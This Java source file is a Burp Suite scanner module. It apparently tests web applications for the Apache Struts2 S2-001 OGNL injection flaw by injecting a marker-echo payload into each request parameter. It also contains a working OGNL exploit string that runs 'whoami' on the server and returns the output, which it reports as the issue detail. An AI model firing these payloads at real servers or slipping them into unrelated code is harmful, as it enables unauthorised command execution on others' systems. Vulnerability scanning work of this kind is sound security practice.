package module.java.vul;

import burp.*;
import module.java.Util;

import java.io.PrintWriter;
import java.net.URLEncoder;
import java.util.Arrays;
import java.util.List;

public class S2_001 extends IModule {
    public String randomMark;
    public String injectMark;
    public String poc;
    public String exp =
            "%{" +
            "#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"whoami\"})).redirectErrorStream(true).start()," +
            "#b=#a.getInputStream()," +
            "#c=new java.io.InputStreamReader(#b)," +
            "#d=new java.io.BufferedReader(#c)," +
            "#e=new char[50000]," +
            "#d.read(#e)," +
            "#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\")," +
            "#f.getWriter().println(new java.lang.String(#e))," +
            "#f.getWriter().flush()," +
            "#f.getWriter().close()" +
            "}";

    public S2_001() {
        moduleName = "S2-001";
        randomMark = Util.getRandomString(16);
        injectMark = Arrays.toString(randomMark.getBytes()).replace("[", "").replace("]", "");
        poc =
            "%{" +
            "#b=new byte[]{" +
            injectMark +
            "}," +
            "#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\")," +
            "#f.getWriter().println(new java.lang.String(#b))," +
            "#f.getWriter().flush()," +
            "#f.getWriter().close()" +
            "}";
    }

    public IScanIssue start() {
        PrintWriter stdout = new PrintWriter(callbacks.getStdout(), true);
        stdout.println("S2_001 start");

        IHttpService httpService = iHttpRequestResponse.getHttpService();
        IRequestInfo requestInfo = helpers.analyzeRequest(iHttpRequestResponse);

        List<IParameter> parameters = requestInfo.getParameters();
        for (IParameter parameter: parameters) {
            if (parameter.getType() == (byte) 0 || parameter.getType() == (byte) 1) {
                IParameter newParameter = helpers.buildParameter(parameter.getName(), URLEncoder.encode(poc), parameter.getType());
                byte[] newRequest = helpers.updateParameter(iHttpRequestResponse.getRequest(), newParameter);
                IHttpRequestResponse newHttpRequestResponse = callbacks.makeHttpRequest(httpService, newRequest);
                byte[] response = newHttpRequestResponse.getResponse();
                IResponseInfo newResponseInfo = helpers.analyzeResponse(response);
                byte[] body = Arrays.copyOfRange(response, newResponseInfo.getBodyOffset(), response.length);

                String bodyText = new String(body);
                if (bodyText.contains(randomMark)) {
                    this.iHttpRequestResponse = newHttpRequestResponse;
                    this.detail = exp;
                    return creatCustomScanIssue();
                }
            }
        }
        return null;
    }
}
